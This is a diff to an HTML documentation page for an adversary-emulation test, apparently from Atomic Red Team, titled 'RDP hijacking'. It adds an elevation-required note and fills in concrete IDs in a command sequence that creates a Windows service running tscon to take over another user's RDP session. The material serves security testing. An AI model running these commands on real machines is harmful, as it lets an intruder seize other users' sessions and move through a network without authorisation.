@@ -384,11 +384,12 @@
 <div class="section" id="atomic-test-1-rdp-hijacking">
 <h3>Atomic Test #1 - RDP hijacking<a class="headerlink" href="#atomic-test-1-rdp-hijacking" title="Permalink to this headline">¶</a></h3>
 <p>RDP hijacking](https://medium.com/&#64;networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6) - how to hijack RDS and RemoteApp sessions transparently to move through an organization</p>
-<p><strong>Supported Platforms:</strong> windows</p>
+<p><strong>Supported Platforms:</strong> windows
+Elevation Required (e.g. root or admin)</p>
 <div class="section" id="attack-commands-run-with-command-prompt">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#attack-commands-run-with-command-prompt" title="Permalink to this headline">¶</a></h4>
 <div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>query user
-sc.exe create sesshijack binpath= &quot;cmd.exe /k tscon #{Session_ID} /dest:#{Destination_ID}&quot;
+sc.exe create sesshijack binpath= &quot;cmd.exe /k tscon 1337 /dest:rdp-tcp#55&quot;
 net start sesshijack
 </pre></div>
 </div>
